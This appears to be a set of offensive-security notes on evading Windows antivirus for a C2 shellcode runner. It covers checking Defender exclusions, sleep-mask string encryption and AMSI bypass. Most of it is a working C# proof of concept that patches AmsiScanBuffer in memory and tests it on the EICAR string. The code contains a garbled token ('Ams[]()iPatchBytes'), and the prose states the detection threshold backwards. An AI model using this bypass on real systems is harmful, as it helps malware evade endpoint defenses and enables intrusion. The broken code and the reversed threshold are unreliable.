

# Tips 
- before trying to bypass the AV, check the Exclusions `Get-MpPreference | select Exclusion*` paths, extention or process. 


# Artifact
artifact is the shellcode runner that take the shellcode of the c2 like sliver and run it. the best option is using `Nim`, `Go` or complex with `C/C++`. 

so your shellcode runner (Artifact) should contains:
### SleepMask
add SleepMask to XOR encrypt the strings in memory to evade from the memory scanner. 

### AmsiScanBuffer Patching
[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) is an API exported from `amsi.dll` - the library that implements the Antimalware Scan Interface (AMSI). Applications, such as PowerShell 

so AmsiScanBuffer will take the buffer and return a number if number less than 32768 mean AMSI_RESULT_DETECTED 

so you becasue you own the process you can write over the memory where AmsiScanBuffer exist and write 
```CSharp 
mov eax, 0x80070057
ret
```

so it will return 0x80070057 which is a code for "invalid parameter". and volaah you bypassed the AMSI, and here a PoC: 

```CSHARP 
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

namespace AmsiBypassDemo
{
    class Program
    {
        static IntPtr _amsiContext;
        static IntPtr _amsiSession;

        static readonly byte[] AmsiPatchBytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        const uint PAGE_EXECUTE_READWRITE = 0x40; 
        
        [DllImport("amsi.dll")]
        static extern uint AmsiInitialize(string appName, out IntPtr amsiContext);

        [DllImport("amsi.dll")]
        static extern uint AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);

        [DllImport("amsi.dll")]
        static extern uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, ref IntPtr amsiSession, out uint scanResult);

        [DllImport("amsi.dll")]
        static extern uint AmsiCloseSession(IntPtr amsiContext, IntPtr amsiSession);

        [DllImport("amsi.dll")]
        static extern void AmsiUninitialize(IntPtr amsiContext);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static string ScanContent(byte[] sample)
        {
            AmsiScanBuffer(_amsiContext, sample, (uint)sample.Length, "Demo Sample", ref _amsiSession, out uint amsiResult);

            return amsiResult >= 32768 ? "AMSI_RESULT_DETECTED" : "AMSI_RESULT_NOT_DETECTED";
        }

        static void Main(string[] args)
        {
            Console.Title = "AMSI Bypass PoC";

            Console.WriteLine("[*] Initializing AMSI...");
            AmsiInitialize("AMSI Bypass Demo App", out _amsiContext);
            AmsiOpenSession(_amsiContext, out _amsiSession);

            var maliciousContent = Encoding.UTF8.GetBytes(@"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

            Console.WriteLine("\n[--- Phase 1: Pre-Patch Scan ---]");
            var resultBefore = ScanContent(maliciousContent);
            Console.WriteLine($"[RESULT] Scan before patch: {resultBefore}");

            if (resultBefore == "AMSI_RESULT_NOT_DETECTED")
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[WARNING] AMSI did not detect the EICAR string. The test might not be effective.");
                Console.WriteLine("    This usually happens if Windows Defender is disabled or if the process context is not trusted.");
                Console.ResetColor();
            }

            Console.WriteLine("\n[--- Phase 2: Applying Patch ---]");

            IntPtr hAmsi = LoadLibrary("amsi.dll");
            IntPtr asbAddress = GetProcAddress(hAmsi, "AmsiScanBuffer");

            if (asbAddress == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Failed to find AmsiScanBuffer address. Exiting.");
                Console.ResetColor();
                return;
            }
            Console.WriteLine($"[+] AmsiScanBuffer Address (ASB): 0x{asbAddress.ToInt64():X}");

            uint oldProtect;
            bool success = VirtualProtect(asbAddress, (UIntPtr)AmsiPatchBytes.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

            if (!success)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] VirtualProtect failed to change memory permissions. Exiting.");
                Console.ResetColor();
                return;
            }
            Console.WriteLine($"[+] Memory permissions changed (Old Protect: 0x{oldProtect:X}).");

            Marshal.Copy(AmsiPatchBytes, 0, asbAddress, Ams[]()iPatchBytes.Length);
            Console.WriteLine($"[+] Wrote {AmsiPatchBytes.Length} bytes patch (mov eax, E_INVALIDARG; ret) to ASB.");

            VirtualProtect(asbAddress, (UIntPtr)AmsiPatchBytes.Length, oldProtect, out uint _);
            Console.WriteLine($"[+] Memory permissions restored to 0x{oldProtect:X}.");


            Console.WriteLine("\n[--- Phase 3: Post-Patch Scan ---]");

            var resultAfter = ScanContent(maliciousContent);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[RESULT] Scan after patch: {resultAfter}");
            Console.ResetColor();

            Console.WriteLine("\n[*] AMSI Uninitialized.");
            AmsiCloseSession(_amsiContext, _amsiSession);
            AmsiUninitialize(_amsiContext);
        }
    }
}
```


### 